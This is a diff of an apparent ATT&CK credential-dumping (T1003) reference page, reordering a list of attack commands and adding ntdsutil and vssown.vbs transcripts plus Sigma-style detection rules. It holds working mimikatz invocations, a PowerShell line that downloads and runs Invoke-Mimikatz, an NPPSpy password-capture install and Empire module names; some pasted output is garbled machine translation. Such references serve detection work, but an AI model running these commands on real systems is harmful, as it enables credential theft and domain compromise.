@@ -31,29 +31,23 @@ Several of the tools mentioned in associated sub-techniques may be used by both 
 
 ```
 hashdump
-mimikatz !lsadump::sam
-hashdump
 run hashdump
 run smart_hashdump
 post/windows/gather/credentials/domain_hashdump
-logonpasswords
-mimikatz !sekurlsa::logonpasswords
-mimikatz !sekurlsa::msv
-mimikatz !sekurlsa::kerberos
-mimikatz !sekurlsa::wdigest
+hashdump
+mimikatz !lsadump::sam
 use mimikatz
 wdigest
 msv
 kerberos
 logonpasswords
+logonpasswords
+mimikatz !sekurlsa::logonpasswords
+mimikatz !sekurlsa::msv
+mimikatz !sekurlsa::kerberos
+mimikatz !sekurlsa::wdigest
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
-
-PathToAtomicsFolder\T1003\bin\gsecdump.exe -a
-
 #{gsecdump_exe} -a
-
-#{gsecdump_exe} -a
-
 Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
 $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
 $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
@@ -64,76 +58,120 @@ $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\Netw
 $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
 $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
 echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
-{'windows': {'psh': {'command': '.\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n', 'payloads': ['totallylegit.exe'], 'cleanup': 'if (Test-Path "C:\\Users\\Public\\creds.dmp") {\n  rm "C:\\Users\\Public\\creds.dmp" -Force;\n};\n'}}}
+PathToAtomicsFolder\T1003\bin\gsecdump.exe -a
+.\totallylegit.exe #{host.process.id} C:\Users\Public\creds.dmp
 ntdsutil.exe
-HKLM\SAM|HKLM\Security\\Windows\\.+\\lsass.exe
 \\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
-powershell/collection/ChromeDump
+HKLM\SAM|HKLM\Security\\Windows\\.+\\lsass.exe
 powershell/collection/ChromeDump
 powershell/collection/FoxDump
-powershell/collection/FoxDump
-powershell/collection/ninjacopy
 powershell/collection/ninjacopy
 powershell/collection/vaults/add_keepass_config_trigger
-powershell/collection/vaults/add_keepass_config_trigger
-powershell/collection/vaults/find_keepass_config
 powershell/collection/vaults/find_keepass_config
 powershell/collection/vaults/get_keepass_config_trigger
-powershell/collection/vaults/get_keepass_config_trigger
-powershell/collection/vaults/keethief
 powershell/collection/vaults/keethief
 powershell/collection/vaults/remove_keepass_config_trigger
-powershell/collection/vaults/remove_keepass_config_trigger
-powershell/credentials/enum_cred_store
 powershell/credentials/enum_cred_store
 powershell/credentials/mimikatz/cache
-powershell/credentials/mimikatz/cache
-powershell/credentials/mimikatz/command
 powershell/credentials/mimikatz/command
 powershell/credentials/mimikatz/dcsync
-powershell/credentials/mimikatz/dcsync
-powershell/credentials/mimikatz/dcsync_hashdump
 powershell/credentials/mimikatz/dcsync_hashdump
 powershell/credentials/mimikatz/extract_tickets
-powershell/credentials/mimikatz/extract_tickets
-powershell/credentials/mimikatz/golden_ticket
 powershell/credentials/mimikatz/golden_ticket
 powershell/credentials/mimikatz/logonpasswords
-powershell/credentials/mimikatz/logonpasswords
-powershell/credentials/mimikatz/lsadump
 powershell/credentials/mimikatz/lsadump
 powershell/credentials/mimikatz/mimitokens
-powershell/credentials/mimikatz/mimitokens
-powershell/credentials/mimikatz/sam
 powershell/credentials/mimikatz/sam
 powershell/credentials/mimikatz/silver_ticket
-powershell/credentials/mimikatz/silver_ticket
-powershell/credentials/mimikatz/trust_keys
 powershell/credentials/mimikatz/trust_keys
 powershell/credentials/powerdump
-powershell/credentials/powerdump
-powershell/credentials/vault_credential
 powershell/credentials/vault_credential
 powershell/management/downgrade_account
-powershell/management/downgrade_account
-powershell/management/wdigest_downgrade
 powershell/management/wdigest_downgrade
 powershell/privesc/gpp
-powershell/privesc/gpp
-powershell/privesc/mcafee_sitelist
 powershell/privesc/mcafee_sitelist
 python/collection/linux/hashdump
-python/collection/linux/hashdump
-python/collection/linux/mimipenguin
 python/collection/linux/mimipenguin
 python/collection/osx/hashdump
-python/collection/osx/hashdump
-python/collection/osx/kerberosdump
 python/collection/osx/kerberosdump
 python/management/multi/kerberos_inject
-python/management/multi/kerberos_inject
 python/situational_awareness/network/dcos/etcd_crawler
-python/situational_awareness/network/dcos/etcd_crawler
+Dos
+C: \ Windows \ system32 \ ntdsutil.exe: ac i ntds
+Examples of activities set to "ntds".
+C: \ Windows \ system32 \ ntdsutil.exe: ifm
+ifm: create full c: \ temp
+Creating a snapshot ...
+Successfully generated snapshot set {ea08df62-9743-4068-aedb-a2c32dfd057f}.
+Snapshot {2d92b366-961f-45f0-9202-9aa6f069139f} has as C: \ $ SNAP_201911011107_VOLUMEC $ \ loading
+Loaded snapshots {2d92b366-961f-45f0-9202-9aa6f069139f}.
+Starting Defragmentation Mode ...
+     Source database: C: \ $ SNAP_201911011107_VOLUMEC $ \ Windows \ NTDS \ ntds.dit
+     Target database: c: \ temp \ Active Directory \ ntds.dit
+
+                  Defragmentation Status (% complete)
+
+          0,102,030,405,060,708,090 100
+          | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
+          .................................................. .
+
+Registry files are being copied ...
+We are copied c: \ temp \ registry \ SYSTEM
+We are copied c: \ temp \ registry \ SECURITY
+Snapshot {2d92b366-961f-45f0-9202-9aa6f069139f} uninstalled.
+In the c: \ temp successfully created IFM media.
+ifm: q
+C: \ Windows \ system32 \ ntdsutil.exe: q
+Dos
+C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / start
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. all rights reserved.
+
+[*] Signal sent to start the VSS service.
+
+C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / create c
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. all rights reserved.
+
+[*] Attempting to create a shadow copy.
+
+C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / list
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. all rights reserved.
+
+SHADOW COPIES
+=============
+
+[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}
+[*] Client accessible: True
+[*] Count: 1
+[*] Device object:? \\ \ GLOBALROOT \ Device \ HarddiskVolumeShadowCopy1
+[*] Differential: True
+[*] Exposed locally: False
+[*] Exposed name:
+[*] Exposed remotely: False
+[*] Hardware assisted: False
+[*] Imported: False
+[*] No auto release: True
+[*] Not surfaced: False
+[*] No writers: True
+[*] Originating machine: ICBC.abcc.org
+[*] Persistent: True
+[*] Plex: False
+[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}
+[*] Service machine: ICBC.abcc.org
+[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}
+[*] State: 12
+[*] Transportable: False
+[*] Volume name:? \\ \ Volume {16da2094-7213-420f-a023-db7b3e3a7f6f} \
+
+
+C: \ Users \ Administrator \ Desktop \ test> copy \\ \ GLOBALROOT \ Device \ HarddiskVolumeShadowCopy1 \ windows \ ntds \ ntds.dit C:? \
+We have copied a file.
+
+C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / delete
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. all rights reserved.
 ```
 
 ## Commands Dataset
@@ -200,17 +238,8 @@ python/situational_awareness/network/dcos/etcd_crawler
              'this account is going to be located in C:\\NPPSpy.txt"',
   'name': None,
   'source': 'atomics/T1003/T1003.yaml'},
- {'command': {'windows': {'psh': {'cleanup': 'if (Test-Path '
-                                             '"C:\\Users\\Public\\creds.dmp") '
-                                             '{\n'
-                                             '  rm '
-                                             '"C:\\Users\\Public\\creds.dmp" '
-                                             '-Force;\n'
-                                             '};\n',
-                                  'command': '.\\totallylegit.exe '
-                                             '#{host.process.id} '
-                                             'C:\\Users\\Public\\creds.dmp\n',
-                                  'payloads': ['totallylegit.exe']}}},
+ {'command': '.\\totallylegit.exe #{host.process.id} '
+             'C:\\Users\\Public\\creds.dmp\n',
   'name': 'Custom GO credential dumper using minidumpwritedump',
   'source': 'data/abilities/credential-access/3c647015-ab0a-496a-8847-6ab173cd2b22.yml'},
  {'command': 'ntdsutil.exe',
@@ -419,7 +448,100 @@ python/situational_awareness/network/dcos/etcd_crawler
   'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
  {'command': 'python/situational_awareness/network/dcos/etcd_crawler',
   'name': 'Empire Module Command',
-  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
+  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
+ {'command': 'Dos\n'
+             'C: \\ Windows \\ system32 \\ ntdsutil.exe: ac i ntds\n'
+             'Examples of activities set to "ntds".\n'
+             'C: \\ Windows \\ system32 \\ ntdsutil.exe: ifm\n'
+             'ifm: create full c: \\ temp\n'
+             'Creating a snapshot ...\n'
+             'Successfully generated snapshot set '
+             '{ea08df62-9743-4068-aedb-a2c32dfd057f}.\n'
+             'Snapshot {2d92b366-961f-45f0-9202-9aa6f069139f} has as C: \\ $ '
+             'SNAP_201911011107_VOLUMEC $ \\ loading\n'
+             'Loaded snapshots {2d92b366-961f-45f0-9202-9aa6f069139f}.\n'
+             'Starting Defragmentation Mode ...\n'
+             '     Source database: C: \\ $ SNAP_201911011107_VOLUMEC $ \\ '
+             'Windows \\ NTDS \\ ntds.dit\n'
+             '     Target database: c: \\ temp \\ Active Directory \\ '
+             'ntds.dit\n'
+             '\n'
+             '                  Defragmentation Status (% complete)\n'
+             '\n'
+             '          0,102,030,405,060,708,090 100\n'
+             '          | ---- | ---- | ---- | ---- | ---- | ---- | ---- | '
+             '---- | ---- | ---- |\n'
+             '          .................................................. .\n'
+             '\n'
+             'Registry files are being copied ...\n'
+             'We are copied c: \\ temp \\ registry \\ SYSTEM\n'
+             'We are copied c: \\ temp \\ registry \\ SECURITY\n'
+             'Snapshot {2d92b366-961f-45f0-9202-9aa6f069139f} uninstalled.\n'
+             'In the c: \\ temp successfully created IFM media.\n'
+             'ifm: q\n'
+             'C: \\ Windows \\ system32 \\ ntdsutil.exe: q',
+  'name': 'Dos',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Dos\n'
+             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
+             'vssown.vbs / start\n'
+             'Microsoft (R) Windows Script Host Version 5.812\n'
+             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
+             '\n'
+             '[*] Signal sent to start the VSS service.\n'
+             '\n'
+             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
+             'vssown.vbs / create c\n'
+             'Microsoft (R) Windows Script Host Version 5.812\n'
+             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
+             '\n'
+             '[*] Attempting to create a shadow copy.\n'
+             '\n'
+             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
+             'vssown.vbs / list\n'
+             'Microsoft (R) Windows Script Host Version 5.812\n'
+             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
+             '\n'
+             'SHADOW COPIES\n'
+             '=============\n'
+             '\n'
+             '[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}\n'
+             '[*] Client accessible: True\n'
+             '[*] Count: 1\n'
+             '[*] Device object:? \\\\ \\ GLOBALROOT \\ Device \\ '
+             'HarddiskVolumeShadowCopy1\n'
+             '[*] Differential: True\n'
+             '[*] Exposed locally: False\n'
+             '[*] Exposed name:\n'
+             '[*] Exposed remotely: False\n'
+             '[*] Hardware assisted: False\n'
+             '[*] Imported: False\n'
+             '[*] No auto release: True\n'
+             '[*] Not surfaced: False\n'
+             '[*] No writers: True\n'
+             '[*] Originating machine: ICBC.abcc.org\n'
+             '[*] Persistent: True\n'
+             '[*] Plex: False\n'
+             '[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}\n'
+             '[*] Service machine: ICBC.abcc.org\n'
+             '[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}\n'
+             '[*] State: 12\n'
+             '[*] Transportable: False\n'
+             '[*] Volume name:? \\\\ \\ Volume '
+             '{16da2094-7213-420f-a023-db7b3e3a7f6f} \\\n'
+             '\n'
+             '\n'
+             'C: \\ Users \\ Administrator \\ Desktop \\ test> copy \\\\ \\ '
+             'GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ '
+             'ntds \\ ntds.dit C:? \\\n'
+             'We have copied a file.\n'
+             '\n'
+             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
+             'vssown.vbs / delete\n'
+             'Microsoft (R) Windows Script Host Version 5.812\n'
+             'Copyright (C) Microsoft Corporation. all rights reserved.',
+  'name': 'Dos',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
 ```
 
 ## Potential Detections
@@ -1037,7 +1159,214 @@ python/situational_awareness/network/dcos/etcd_crawler
   'product': 'Azure Sentinel',
   'query': 'Sysmon| where EventID == 1 and process_path contains "reg.exe"and '
            '(process_command_line contains "*save*HKLM\\\\sam*"or '
-           'process_command_line contains "*save*HKLM\\\\system*")'}]
+           'process_command_line contains "*save*HKLM\\\\system*")'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: VSS shadow copy Ntds.dit file read local (host OS control '
+           'field, is also applicable to a VSS shadow copy remote read '
+           'Ntds.dit file)\n'
+           'description: windows server 2008 simulation test results\n'
+           'references: https://1sparrow.com/2018/02/19/ infiltration '
+           'associated domain /\n'
+           'tags: T1003-003\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: sysmon\n'
+           'detection:\n'
+           '    selection1:\n'
+           '        EventID: 1 # Process Creation\n'
+           "        Image: 'C: \\ Windows \\ System32 \\ vssadmin.exe'\n"
+           "        CommandLine: 'VSSADMIN.EXE'\n"
+           "        CurrentDirectory: 'vssadmin create shadow / for = C:'\n"
+           '    selection2:\n'
+           '        EventID: 1\n'
+           "        Image: 'C: \\ Windows \\ System32 \\ reg.exe'\n"
+           "        CommandLine: 'reg.exe'\n"
+           "        CurrentDirectory: 'reg SAVE HKLM \\ SYSTEM *'\n"
+           '    selection3:\n'
+           '        EventID: 1 # Process Creation\n'
+           "        Image: 'C: \\ Windows \\ System32 \\ vssadmin.exe'\n"
+           "        CommandLine: 'VSSADMIN.EXE'\n"
+           "        CurrentDirectory: 'vssadmin delete shadows / all'\n"
+           '    condition: selection1 or selection2 or selection3\n'
+           'level: medium'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: Use vssown.vbs get NTDS.dit file\n'
+           'description: windows server 2016+ AD domain controller\n'
+           'tags: T1003-003\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: security\n'
+           'detection:\n'
+           '    selection:\n'
+           '        EventID: 4688 # have created a new process.\n'
+           '        New processname: C: \\ Windows \\ System32 \\ cscript.exe\n'
+           '        Process commandline:\n'
+           '           - cscript * .vbs / start # command line based '
+           'detection\n'
+           '           - cscript * .vbs / create c # command line based '
+           'detection\n'
+           '           - cscript * .vbs / delete # command line based '
+           'detection\n'
+           '           - cscript * .vbs / list # command line based detection\n'
+           '    condition: selection\n'
+           '---\n'
+           'detection:\n'
+           '    selection1:\n'
+           '        EventID: 4904 # has been trying to register a security '
+           'event source.\n'
+           '        Processname: C: \\ Windows \\ System32 \\ VSSVC.exe\n'
+           '        Source name: VSSAudit # Event Source\n'
+           '    selection2:\n'
+           '        EventID: 8222 # shadow copy has been created.\n'
+           '        Process image name: C: \\ Windows \\ System32 \\ wbem \\ '
+           'WmiPrvSE.exe\n'
+           '        Raw volume: \\\\ \\ Volume {*} \\ # "*" represents the '
+           'regular match?\n'
+           '        Shadow device name: \\\\ \\ GLOBALROOT \\ Device \\ '
+           'HarddiskVolumeShadowCopy * # "*" represents the regular match?\n'
+           '    selection3:\n'
+           '        EventID: 4905 # has been trying to unregister a security '
+           'event source.\n'
+           '        Processname: C: \\ Windows \\ System32 \\ VSSVC.exe\n'
+           '        Source name: VSSAudit # Event Source\n'
+           '    timeframe: last 10S # custom time range\n'
+           '    condition: all of them\n'
+           'level: medium'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: Use ntdsutil get NTDS.dit file\n'
+           'description: windows server 2008 + AD domain controller\n'
+           'references: '
+           'https://blog.csdn.net/Fly_hps/article/details/80641987\n'
+           'tags: T1003-003\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: security\n'
+           'detection:\n'
+           '    selection:\n'
+           '        EventID: 4688 # have created a new process.\n'
+           "        Newprocessname: 'C: \\ Windows \\ System32 \\ "
+           "ntdsutil.exe' # new process name\n"
+           '    condition: selection\n'
+           'level: medium'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: Application log file detection ntdsutil get NTDS.dit\n'
+           'description: windows server 2008 + AD domain controller\n'
+           'references: '
+           'https://blog.csdn.net/Fly_hps/article/details/80641987\n'
+           'tags: T1003-003\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: application\n'
+           'detection:\n'
+           '    selection1:\n'
+           '        EventID: 2005\n'
+           "        Message: 'lsass (*) * Example shadow copy is starting. "
+           'This will be a complete shadow copy. * # Represents any number '
+           "'value matches\n"
+           '    selection2:\n'
+           '        EventID: 2001\n'
+           "        Message: 'lsass (*) * Shadow copy instance freeze has "
+           "begun. * # Represents any number 'value matches\n"
+           '    selection3:\n'
+           '        EventID: 2003\n'
+           "        Message: 'lsass (*) * Shadow copy instance freeze stopped. "
+           "* # Represents any number 'value matches\n"
+           '    selection4:\n'
+           '        EventID: 2006\n'
+           "        Message: 'lsass (*) * Volume Shadow Copy instance "
+           "completed successfully. * # Represents any number 'value matches\n"
+           '    selection5:\n'
+           '        EventID: 300\n'
+           '        Message: lsass (*) The database engine is initialized '
+           'recovery steps. On behalf of any value matches the number # *\n'
+           '    selection6:\n'
+           '        EventID: triggering a large number of events during the '
+           '216 216 #\n'
+           "        Message: 'lsass (*) detects that the database location "
+           'changed from: "C \\ Windows \\ NTDS \\ ntds.dit" is "? \\\\ \\ '
+           'GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy * 1 * \\ Windows '
+           '\\ NTDS \\ ntds.dit". * # Represents any number \'value matches\n'
+           '    selection7:\n'
+           '        EventID: 302\n'
+           "        Message: 'lsass (*) The database engine has successfully "
+           "completed recovery steps. * # Represents any number 'value "
+           'matches\n'
+           'timeframe: last 10S # custom time range\n'
+           '    condition: all of them\n'
+           'level: medium'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: win-vaultcmd obtain basic information system credentials\n'
+           'description: windows server 2016\n'
+           'tags: T1003\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: security / Sysmon\n'
+           'detection:\n'
+           '    selection:\n'
+           '        EventID:\n'
+           '           - 4688 #windows security log, have created a new '
+           'process.\n'
+           '           - 1 #windows Sysmon log, create a new process\n'
+           '        New processname: C: \\ Windows \\ System32 \\ VaultCmd.exe '
+           '# new process name / image\n'
+           '        Parent processname: C: \\ Windows \\ System32 \\ cmd.exe # '
+           'creator Process Name / ParentImage\n'
+           '        Process commandline:\n'
+           '           - vaultcmd / list # list the vault (vault) list\n'
+           '           - vaultcmd / listschema # listed vault (vault) a '
+           'summary of the credentials name and GUID\n'
+           '           - vaultcmd / listcreds: {*} # Chinese system, the list '
+           'of all the credentials of the GUID} * {vault (Vault)\n'
+           '           All credential information under the "*" # English '
+           'system, called the list "*" vault (vault): vaultcmd / listcreds -\n'
+           '           - vaultcmd / listproperties: {*} # Chinese system, as '
+           'listed attributes GUID} * {vault (Vault), including the file '
+           'location, the number of credentials included, protection method\n'
+           '    condition: selection'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: plaintext to obtain the voucher --Procdump\n'
+           'description: windows server 2008 simulation test results\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: sysmon\n'
+           'detection:\n'
+           '    selection1:\n'
+           '        EventID: 1\n'
+           "        Image: '* \\ procdump * .exe'\n"
+           '        Product: ProcDump\n'
+           '        OriginalFileName: procdump\n'
+           "        CommandLine: 'procdump * .exe -ma lsass.exe * .dmp'\n"
+           '    selection2:\n'
+           '        EventID: 10\n'
+           "        SourceImage: '* \\ procdump * .exe'\n"
+           "        TargetImage: 'C: \\ Windows \\ system32 \\ lsass.exe'\n"
+           '    timeframe: last 1m\n'
+           '    condition: all of them\n'
+           'level: medium'}]
 ```
 
 ## Raw Dataset
